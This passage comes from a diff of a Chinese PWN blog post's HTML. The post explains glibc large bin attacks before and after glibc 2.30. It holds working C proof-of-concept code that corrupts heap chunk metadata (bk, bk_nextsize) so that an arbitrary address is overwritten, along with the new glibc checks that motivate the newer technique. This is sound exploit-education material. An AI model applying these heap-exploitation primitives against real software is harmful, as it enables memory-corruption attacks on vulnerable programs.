largebin.c -o largebin</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"> </span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">free</span>(p1);</span><br><span class="line">     <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">     <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">free</span>(p3);</span><br><span class="line"> </span><br><span class="line">     p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">     p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">     p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">     p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">     p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="libc2-31后的large-bin-attack"><a href="#libc2-31后的large-bin-attack" class="headerlink" title="libc2.31后的large_bin attack"></a>libc2.31后的large_bin attack</h2><p>2.30以后新增了两个检查</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这两个检查直接导致了，之前的large_bin attack死掉了。</p>
 <p>然后再看看新的largebin_attack,实现利用的代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;<br>    fwd = bck;<br>    bck = bck-&gt;bk;<br>    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>chunk1进入largebin后，此时有一个chunk2（size大于chunk1）,我们修改chunk1的bk_next_size为targe-0x20,此时再通过malloc将chunk2挂载进largebin，此时target被修改成chunk2的地址。</p>
-<h3 id="how-to-heap"><a href="#how-to-heap" class="headerlink" title="how to heap"></a>how to heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A revisit to large bin attack for after glibc2.30</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Relevant code snippet :</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="hljs-comment">        fwd = bck;</span><br><span class="hljs-comment">        bck = bck-&gt;bk;</span><br><span class="hljs-comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="hljs-comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="hljs-comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span><br>  setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 1 : \n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 2 : \n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This prevents the traditional large bin attack\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);<br><br>  <span class="hljs-type">size_t</span> target = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);<br>  <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-type">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And another chunk to prevent consolidate\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);<br>  <span class="hljs-type">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-type">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="hljs-number">-4</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-type">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, p1<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, (<span class="hljs-type">void</span> *)target);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="hljs-type">size_t</span>*)target);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);<br><br>  assert((<span class="hljs-type">size_t</span>)(p2<span class="hljs-number">-2</span>) == target);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-
-              
-            </div>
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>任意地址写较大数总结</div>
-      <div>http://gxher.github.io/2022/07/01/Large_ubsorted/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>gxh</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年7月1日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
-              </a>
-            
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/07/10/glibc%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%98%E5%8A%A8/" title="GLIBC版本更新的一些变动">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">GLIBC版本更新的一些变动</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/07/01/armpwn%E5%85%A5%E9%97%A8/" title="ARMPWN入门">
-                        <span class="hidden-mobile">ARMPWN入门</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/gxher?tab=repositories" target="_blank" rel="nofollow noopener"><span>Try your best!</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
-    });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
-</script>
-
-
-  <script>
-  (function() {
-    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
-    var enableCopy = CONFIG.copy_btn;
-    if (!enableLang && !enableCopy) {
-      return;
-    }
-
-    function getBgClass(ele) {
-      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
-    }
-
-    var copyTmpl = '';
-    copyTmpl += '<div class="code-widget">';
-    copyTmpl += 'LANG';
-    copyTmpl += '</div>';
-    jQuery('.markdown-body pre').each(function() {
-      var $pre = jQuery(this);
-      if ($pre.find('code.mermaid').length > 0) {
-        return;
-      }
-      if ($pre.find('span.line').length > 0) {
-        return;
-      }
-
-      var lang = '';
-
-      if (enableLang) {
-        lang = CONFIG.code_language.default;
-        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
-          lang = $pre[0].children[0].classList[1];
-        } else if ($pre[0].getAttribute('data-language')) {
-          lang = $pre[0].getAttribute('data-language');
-        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
-          lang = $pre[0].children[0].classList[1];
-          $pre.parent().addClass('code-wrapper');
-        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
-          $pre.wrap('<div class="code-wrapper"></div>');
-        }
-        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
-      }
-      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
-        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
-
-      if (enableCopy) {
-        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
-          var clipboard = new window.ClipboardJS('.copy-btn', {
-            target: function(trigger) {
-              var nodes = trigger.parentNode.childNodes;
-              for (var i = 0; i < nodes.length; i++) {
-                if (nodes[i].tagName === 'CODE') {
-                  return nodes[i];
-                }
-              }
+<h3 id="how-to-heap"><a href="#how-to-heap" class="headerlink" title="how to heap"></a>how to heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">        fwd = bck;</span></span><br><span class="line"><span class="comment">        bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span 